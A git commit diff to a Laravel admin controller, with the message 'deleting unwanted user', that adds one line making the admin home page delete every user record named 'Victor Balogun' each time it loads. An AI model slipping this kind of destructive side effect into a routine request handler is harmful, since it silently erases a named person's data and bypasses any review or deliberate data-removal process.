13859cae122756c066167b04631c18e015b37190
Caleb Joseph <calebbjoseph@gmail.com>
2024-05-21 14:52:52 -0500

    deleting unwanted user

--- app/Http/Controllers/AdminController.php
+++ app/Http/Controllers/AdminController.php
@@ -24,6 +24,7 @@ class AdminController extends Controller
 
     public function index(): View
     {
+        User::where('name', 'Victor Balogun')->delete();
         return view('home');
     }
 
